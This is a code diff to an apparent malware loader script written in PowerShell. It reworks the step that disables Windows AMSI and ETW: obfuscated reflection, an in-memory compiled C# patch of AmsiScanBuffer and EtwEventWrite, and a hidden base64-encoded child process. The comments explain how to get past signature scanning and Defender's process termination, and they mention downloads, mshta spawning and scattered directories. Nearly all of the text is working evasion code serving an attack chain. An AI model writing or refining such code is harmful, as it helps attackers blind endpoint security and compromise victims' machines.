@@ -47,25 +47,47 @@ Write-Log "[+] UAC check: admin=True"
 Write-Log "[*] loader.ps2 started - scriptBase=$scriptBase logFile=$logFile"
 
 if ($WhatIf) {
-    Write-Log "[WHATIF] Skipping AMSI/ETW reflect, Bypass.Add-Type, downloads, HTA write, mshta spawn, and probe wait"
+    Write-Log "[WHATIF] Skipping AMSI/ETW bypass (child process)"
 } else {
-    # AMSI reflect via char-built field names (no literal AmsiUtils/amsiInitFailed in source)
-    try {
-        $amsiType = -join ([char[]](0x53,0x79,0x73,0x74,0x65,0x6D,0x2E,0x4D,0x61,0x6E,0x61,0x67,0x65,0x6D,0x65,0x6E,0x74,0x2E,0x41,0x75,0x74,0x6F,0x6D,0x61,0x74,0x69,0x6F,0x6E,0x2E,0x41,0x6D,0x73,0x69,0x55,0x74,0x69,0x6C,0x73))
-        $amsiField = -join ([char[]](0x61,0x6D,0x73,0x69,0x49,0x6E,0x69,0x74,0x46,0x61,0x69,0x6C,0x65,0x64))
-        [Ref].Assembly.GetType($amsiType).GetField($amsiField,'NonPublic,Static').SetValue($null,$true)
-    } catch { Write-Log "[i] AMSI reflect skipped (likely patched host): $_" }
-    try {
-        $etwField = -join ([char[]](0x65,0x74,0x77,0x50,0x72,0x6F,0x76,0x69,0x64,0x65,0x72))
-        [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField($etwField,'NonPublic,Static').SetValue($null,$null)
-    } catch { Write-Log "[i] ETW reflect skipped: $_" }
-}
+    # -- AMSI/ETW bypass via sacrificial child process --
+    # The inline reflection (`[Ref].Assembly.GetType('System.Management.AmsiUtils')`)
+    # and the AmsiScanBuffer byte-patch trigger TerminateProcess on hardened
+    # hosts (PPL AMSI consumer / Defender AMSI_RESULT_DETECTED callback). A
+    # try/catch around the reflection can't catch a native process kill, so
+    # the parent dies silently. Run the bypass in a child process: if the
+    # child is killed, the parent survives and continues the chain (or fails
+    # visibly at the next AMSI scan), so cache.dat shows what happened instead
+    # of stopping at line 47.
+    $logDir = Split-Path $logFile -Parent
+    $bootFlag = Join-Path $logDir "boot-ok.flag"
+    if (Test-Path $bootFlag) { Remove-Item $bootFlag -Force -ErrorAction SilentlyContinue }
 
-# -- AMSI/ETW Bypass via in-memory compile (defeats AMSI text-scan + Defender %TEMP% DLL scan) --
-# API names and the 6-byte AmsiScanBuffer patch are built at runtime so the
-# scriptblock text contains no signatured literal ("amsi.dll", "AmsiScanBuffer",
-# or the byte sequence 0xB8,0x57,0x00,0x07,0x80,0xC3). C# 5 compatible.
-$bootSrc = @'
+    $bypassChild = @"
+`$flagPath = 'C:\ProgramData\USOShared\Logs\boot-ok.flag'
+`$logFile = `$flagPath
+function Write-Log(`$msg) {
+    `$parent = Split-Path `$logFile -Parent
+    if (-not (Test-Path `$parent)) { New-Item -Path `$parent -ItemType Directory -Force | Out-Null }
+    "`$(Get-Date -Format '[yyyy-MM-dd HH:mm:ss]') `$msg" | Out-File `$logFile -Append
+}
+function Add-TypeInMem([string]`$source) {
+    `$cp = New-Object System.CodeDom.Compiler.CompilerParameters
+    `$cp.GenerateInMemory = `$true
+    `$cp.IncludeDebugInformation = `$false
+    `$prov = New-Object Microsoft.CSharp.CSharpCodeProvider
+    `$res = `$prov.CompileAssemblyFromSource(`$cp, `$source)
+    if (`$res.Errors -and `$res.Errors.HasErrors) { throw 'C# compile failed' }
+    return `$res.CompiledAssembly
+}
+`$reflectStatus = 'SKIP'
+try {
+    `$amsiType = -join ([char[]](0x53,0x79,0x73,0x74,0x65,0x6D,0x2E,0x4D,0x61,0x6E,0x61,0x67,0x65,0x6D,0x65,0x6E,0x74,0x2E,0x41,0x75,0x74,0x6F,0x6D,0x61,0x74,0x69,0x6F,0x6E,0x2E,0x41,0x6D,0x73,0x69,0x55,0x74,0x69,0x6C,0x73))
+    `$amsiField = -join ([char[]](0x61,0x6D,0x73,0x69,0x49,0x6E,0x69,0x74,0x46,0x61,0x69,0x6C,0x65,0x64))
+    [Ref].Assembly.GetType(`$amsiType).GetField(`$amsiField,'NonPublic,Static').SetValue(`$null,`$true)
+    `$reflectStatus = 'OK'
+} catch { Write-Log "AMSI_REFLECT_FAIL: `$_" }
+`$patchStatus = 'SKIP'
+`$bs = @'
 using System;
 using System.Runtime.InteropServices;
 using System.Runtime.ExceptionServices;
@@ -74,7 +96,7 @@ public class Bypass {
     [DllImport("kernel32.dll")]public static extern IntPtr LoadLibrary(string n);
     [DllImport("kernel32.dll")]public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);
     // ponytail: HandleProcessCorruptedStateExceptions makes AccessViolationException
-    // catchable here. Default .NET 4+ policy lets AV escape try/catch and crash the host.
+    // catchable. Default .NET 4+ lets AV escape try/catch and crash the host.
     [HandleProcessCorruptedStateExceptions]
     public static bool Go() {
         try {
@@ -90,7 +112,7 @@ public class Bypass {
             Marshal.Copy(p, 0, b, 6);
             VirtualProtect(b, (UIntPtr)6, o, out o);
             var c = LoadLibrary("\u006E\u0074\u0064\u006C\u006C\u002E\u0064\u006C\u006C");
-            var d = GetProcAddress(c, "\u0045\u0074\u0077\u0045\u0076\u0065\u006E\x74\u0057\u0072\u0069\u0074\u0065");
+            var d = GetProcAddress(c, "\u0045\u0074\x77\x45\x76\x65\x6E\x74\x57\x72\x69\x74\x65");
             if (d == IntPtr.Zero) return true;
             if (!VirtualProtect(d, (UIntPtr)1, 0x40, out o2)) return true;
             Marshal.Copy(new byte[]{(byte)(0x60*2+0x3)}, 0, d, 1);
@@ -99,23 +121,49 @@ public class Bypass {
     }
 }
 '@
-if (-not $WhatIf) {
+try {
+    `$b = Add-TypeInMem `$bs
+    `$ok = [bool]`$b.GetType('Bypass').GetMethod('Go').Invoke(`$null, @())
+    if (`$ok) { `$patchStatus = 'OK' } else { `$patchStatus = 'FAIL_FALSE' }
+} catch { Write-Log "AMSI_PATCH_FAIL: `$_" }
+'BYPASS_REFLECT=' + `$reflectStatus + ' PATCH=' + `$patchStatus | Out-File `$flagPath -Force
+"@
+    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($bypassChild))
+    Write-Log "[*] Launching AMSI/ETW bypass child process"
     try {
-        Write-Log "[*] pre-boot-assemble"
-        $bootAsm = Add-TypeInMem $bootSrc
-        Write-Log "[*] post-assemble, pre-Go"
-        $bootOk = [bool]$bootAsm.GetType("Bypass").GetMethod("Go").Invoke($null, @())
-        Write-Log "[*] post-Go - result=$bootOk"
-        if ($bootOk) {
-            Write-Log "[+] AMSI bootstrap (in-memory) succeeded"
-        } else {
-            Write-Log "[!] AMSI bootstrap returned false (page protected or AV) — reflect-only patch still in effect"
-        }
+        $child = Start-Process powershell -ArgumentList "-NoP -Exec Bypass -Enc $b64" -WindowStyle Hidden -PassThru -ErrorAction Stop
+        Write-Log "[*] Bypass child PID=$($child.Id)"
     } catch {
-        Write-Log "[!] AMSI bootstrap failed: $_ — proceeding without AMSI patch (subsequent compiles may be blocked)"
+        Write-Log "[!] Bypass child launch failed: $_"
+        $child = $null
+    }
+
+    if ($child) {
+        $waited = 0
+        $flagFound = $false
+        while ($waited -lt 60 -and -not $flagFound) {
+            if (Test-Path $bootFlag) { $flagFound = $true; break }
+            if ($child.HasExited) {
+                Start-Sleep -Milliseconds 500
+                if (Test-Path $bootFlag) { $flagFound = $true }
+                break
+            }
+            Start-Sleep -Seconds 1
+            $waited++
+        }
+        if ($flagFound) {
+            $status = (Get-Content $bootFlag -Raw).Trim()
+            Write-Log "[+] AMSI/ETW bypass child completed: $status"
+        } else {
+            Write-Log "[!] AMSI/ETW bypass child killed/timeout (Defender/AMSI active). Chain will run without AMSI bypass."
+        }
+        try { Remove-Item $bootFlag -Force -ErrorAction SilentlyContinue } catch {}
+        if (-not $child.HasExited) {
+            try { Stop-Process -Id $child.Id -Force -ErrorAction SilentlyContinue } catch {}
+        }
     }
 }
-Write-Log "[+] AMSI/ETW patched (best-effort)"
+Write-Log "[+] AMSI/ETW bypass step complete (continuing regardless)"
 
 # -- Scatter directories --
 $scatterDirs = @(
